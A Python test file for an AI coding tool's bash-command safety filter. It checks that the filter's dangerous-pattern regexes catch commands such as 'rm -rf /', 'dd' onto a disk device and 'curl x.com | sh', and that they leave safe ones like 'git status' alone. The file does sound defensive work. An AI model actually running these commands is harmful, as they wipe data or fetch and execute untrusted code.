"""Tests for tools security and functionality."""
from hellocode.tools.builtin import BashTool, KnowledgeTool, _DANGEROUS_PATTERNS
from hellocode.tools.base import ToolContext
from hellocode.storage import Storage
from pathlib import Path
import tempfile
import pytest
import re


class TestBashToolSecurity:
    def setup_method(self):
        self.tool = BashTool()

    def test_dangerous_rm_rf(self):
        for pattern in _DANGEROUS_PATTERNS:
            if "rm" in pattern:
                assert re.search(pattern, "rm -rf /", re.IGNORECASE)
                assert re.search(pattern, "rm -rf /home", re.IGNORECASE)
                break

    def test_dangerous_format(self):
        assert re.search(r"\bformat\s+[a-zA-Z]:", "format C:", re.IGNORECASE)

    def test_dangerous_dd(self):
        assert re.search(r"\bdd\s+if=.*of=/dev/", "dd if=image of=/dev/sda", re.IGNORECASE)

    def test_dangerous_curl_pipe(self):
        assert re.search(r"\bcurl.*\|\s*(ba)?sh\b", "curl x.com | sh", re.IGNORECASE)
        assert re.search(r"\bwget.*\|\s*(ba)?sh\b", "wget x.com | bash", re.IGNORECASE)

    def test_safe_commands_not_blocked(self):
        for pattern in _DANGEROUS_PATTERNS:
            assert not re.search(pattern, "ls -la", re.IGNORECASE)
            assert not re.search(pattern, "python script.py", re.IGNORECASE)
            assert not re.search(pattern, "git status", re.IGNORECASE)


class TestKnowledgeTool:
    def test_instance_cache(self):
        tool = KnowledgeTool()
        tmp = Path(tempfile.mkdtemp())
        db = tmp / "test.db"
        s = Storage(db)
        e1 = tool._get_engine(s, tmp)
        e2 = tool._get_engine(s, tmp)
        assert e1 is e2
        s.close()
